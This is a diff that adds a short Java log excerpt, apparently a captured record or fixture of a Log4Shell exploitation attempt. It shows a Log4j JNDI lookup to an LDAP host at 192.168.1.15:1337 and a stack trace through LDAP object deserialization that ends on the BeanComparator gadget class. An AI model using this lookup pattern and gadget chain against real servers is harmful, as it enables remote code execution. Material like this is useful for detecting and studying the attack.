@@ -1,0 +1,14 @@
+http-nio-80-exec-13 WARN Error looking up JNDI resource [ldap://192.168.1.15:1337/e]. javax.naming.NamingException [Root exception is java.lang.ClassNotFoundException: org.apache.commons.beanutils.BeanComparator]; remaining name 'e'
+	at java.naming/com.sun.jndi.ldap.Obj.deserializeObject(Obj.java:531)
+	at java.naming/com.sun.jndi.ldap.Obj.decodeObject(Obj.java:237)
+	at java.naming/com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1051)
+	at java.naming/com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
+	at java.naming/com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
+	at java.naming/com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:207)
+	at java.naming/com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
+	at java.naming/javax.naming.InitialContext.lookup(InitialContext.java:409)
+	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:128)
+	at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:55)
+	at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:159)
+	at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1046)
+	...
